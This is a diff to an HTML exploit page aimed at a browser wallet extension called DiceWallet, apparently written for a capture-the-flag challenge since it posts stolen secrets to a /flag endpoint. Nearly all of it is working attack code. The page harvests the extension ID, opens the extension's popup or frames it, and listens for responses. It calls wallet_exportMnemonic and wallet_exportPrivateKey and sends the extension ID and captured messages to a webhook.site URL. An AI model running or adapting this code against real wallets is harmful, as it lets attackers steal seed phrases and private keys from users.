@@ -1,109 +1,142 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>DiceWallet Exploit v2</title>
+    <title>DiceWallet Exploit - Popup Method</title>
 </head>
 <body>
     <h1>DiceWallet Exploit</h1>
     <div id="status"></div>
     
     <script>
-        const WEBHOOK_URL = 'https://e12d2551-e904-4c69-afb6-790abe2d8f6b.webhook.site';
+        const WEBHOOK_URL = 'https://a01e28d1-26bd-4236-b3de-72d0a426ca16.webhook.site';
         
         function log(msg) {
             document.getElementById('status').innerHTML += '<br>' + msg;
             console.log(msg);
         }
         
-        function sendToWebhook(data) {
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).catch(() => {
-                // Fallback to image if fetch fails
-                new Image().src = `${WEBHOOK_URL}?data=${encodeURIComponent(JSON.stringify(data))}`;
-            });
-        }
-        
         async function exploit() {
-            log('1. Waiting for ethereum provider...');
+            log('1. Looking for extension ID...');
             
-            await new Promise(resolve => {
-                if (window.ethereum) {
-                    resolve();
-                } else {
-                    window.addEventListener('dwOnReady', resolve, { once: true });
-                    setTimeout(resolve, 5000);
+            // Tìm extension ID
+            const scripts = document.getElementsByTagName('script');
+            let extensionId = null;
+            let extensionUrl = null;
+            
+            for (let script of scripts) {
+                const src = script.src;
+                if (src && src.startsWith('moz-extension://')) {
+                    extensionUrl = src;
+                    extensionId = src.split('/')[3];
+                    log(`✅ Found extension: ${extensionId}`);
+                    break;
                 }
-            });
+            }
             
-            if (!window.ethereum) {
-                log('❌ No ethereum provider');
+            if (!extensionId) {
+                log('❌ No extension found');
                 return;
             }
             
-            log('2. Ethereum provider ready!');
+            // Gửi extension ID về webhook
+            fetch(`${WEBHOOK_URL}?extensionId=${extensionId}`);
             
-            // Danh sách methods cần test
-            const methods = [
-                // Basic
-                'eth_chainId',
-                'eth_accounts',
-                'net_version',
-                'eth_blockNumber',
-                
-                // Wallet specific
-                'wallet_getState',
-                'wallet_getAccounts',
-                'wallet_getCurrentAccount',
-                
-                // Try to get info without allowed origin
-                'personal_sign',
-                'eth_sign',
-                'eth_signTypedData',
-                'eth_signTypedData_v3',
-                'eth_signTypedData_v4',
-                
-                // Maybe these work?
-                'wallet_exportPublicKey',
-                'wallet_exportAddress',
-                'wallet_getBalance'
-            ];
+            log('2. Setting up message listener...');
             
-            log('3. Testing methods...');
-            
-            for (const method of methods) {
-                try {
-                    log(`Testing ${method}...`);
-                    const result = await window.ethereum.request({ method });
-                    log(`✅ ${method}:`, result);
+            // Lắng nghe messages từ popup
+            window.addEventListener('message', (e) => {
+                if (e.data && (e.data.type === 'DICE_RESPONSE' || e.data.type === 'DICE_ERROR')) {
+                    log('📨 Received message from popup:', e.data);
                     
-                    sendToWebhook({
-                        type: 'method_success',
-                        method,
-                        result
+                    // Gửi về webhook
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            type: 'popup_message',
+                            data: e.data
+                        })
                     });
                     
-                } catch (e) {
-                    log(`❌ ${method}: ${e.message}`);
-                    
-                    sendToWebhook({
-                        type: 'method_error',
-                        method,
-                        error: e.message
-                    });
+                    // Nếu có mnemonic hoặc private key
+                    if (e.data.result && (e.data.result.mnemonic || e.data.result.privateKey)) {
+                        log('🎯 Found credentials!');
+                        
+                        // Thử gửi flag
+                        const mnemonic = e.data.result.mnemonic || e.data.result.privateKey;
+                        fetch('/flag', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ mnemonic })
+                        }).then(r => r.json()).then(data => {
+                            if (data.flag) {
+                                log(`🏁 FLAG: ${data.flag}`);
+                            }
+                        });
+                    }
                 }
+            });
+            
+            log('3. Opening popup.html...');
+            
+            // Mở popup
+            const popupUrl = `moz-extension://${extensionId}/popup.html`;
+            const popup = window.open(popupUrl, '_blank', 'width=400,height=600');
+            
+            if (!popup) {
+                log('❌ Cannot open popup - blocked by browser');
                 
-                // Delay giữa các request
-                await new Promise(r => setTimeout(r, 500));
+                // Thử cách khác: tạo iframe
+                log('Trying iframe instead...');
+                const iframe = document.createElement('iframe');
+                iframe.src = popupUrl;
+                iframe.style.width = '400px';
+                iframe.style.height = '600px';
+                iframe.style.position = 'fixed';
+                iframe.style.top = '10px';
+                iframe.style.right = '10px';
+                iframe.style.zIndex = '9999';
+                document.body.appendChild(iframe);
+                
+                log('Iframe added - check if messages appear');
             }
             
-            log('=== Exploit Complete ===');
+            log('4. Waiting for messages from popup...');
+            
+            // Thử gửi message đến background script
+            try {
+                const response = await chrome.runtime.sendMessage(extensionId, {
+                    type: 'DICE_POPUP',
+                    action: 'getState'
+                });
+                log('Background response:', response);
+            } catch (e) {
+                log('Cannot send to background:', e.message);
+            }
+            
+            // Thử gọi các methods qua window.ethereum
+            if (window.ethereum) {
+                log('5. Testing wallet methods...');
+                
+                try {
+                    const result = await window.ethereum.request({
+                        method: 'wallet_exportMnemonic'
+                    });
+                    log('wallet_exportMnemonic:', result);
+                } catch (e) {}
+                
+                try {
+                    const result = await window.ethereum.request({
+                        method: 'wallet_exportPrivateKey'
+                    });
+                    log('wallet_exportPrivateKey:', result);
+                } catch (e) {}
+            }
+            
+            log('=== Exploit running - check webhook ===');
         }
         
-        log('0. Starting exploit...');
+        // Start
         exploit();
     </script>
 </body>
